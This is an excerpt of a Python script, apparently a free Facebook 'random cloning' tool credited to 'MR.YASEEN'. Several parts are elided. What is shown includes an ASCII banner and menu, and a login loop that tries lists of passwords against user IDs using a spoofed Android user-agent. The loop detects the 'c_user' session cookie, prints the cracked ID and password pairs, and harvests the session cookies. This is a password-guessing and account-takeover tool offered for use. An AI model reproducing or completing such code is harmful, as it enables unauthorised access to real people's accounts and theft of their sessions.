...
\x1b[1;97m YP   YD  `Y88P'       YP   YD  `Y88P'\033[1;37m 
----------------------------------------------
\033[1;37m[*] AUTHOR    : MR.YASEEN
\033[1;37m[*] FACEBOOK  : YASEEN
\033[1;37m[*] STATUS    : FREE
\033[1;37m[*] TOOL      : RANDOM 
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        for i in range(len(game)):
            ...
            print(f"{GREEN}[MR❤YASEEN]---------------------------------------------------[âˆš]")
    #____________#
def ARIX():
    #os.system("play-audio WELCOME_TO_kb_BOOT_818.mp3")
    os.getuid
    os.system("clear");print(logo)
    print('  \x1b[97m[\033[37;41m  WELCOME TO MR  YASEEN TOOLS   \033[0;m] ')
    print(f"")
    print(f"[1] {WHITE}START RANDOM CLONING")
    print(f"[0] {WHITE}EXIT ")
    print(f"")
    print(f"\033[1;37m==================================================")
    Kashif = input("CHOOSE : ")
    if Kashif in ["1","01"]:
...
def free(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'user-agent': 'Mozilla/5.0 (Linux; Android 13; Infinix X6731 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.114 Mobile Safari/537.36',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[YASEEN-,OK-💚]  ' +cid+ ' | ' +ps+    '\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                #print('\33[1;31m[YASEEN-💔]  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r%s|YASEEN-OK:\033[1;32m%s\033[1;37m:\033[1;31m%s\033[1;37m '%(loop,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
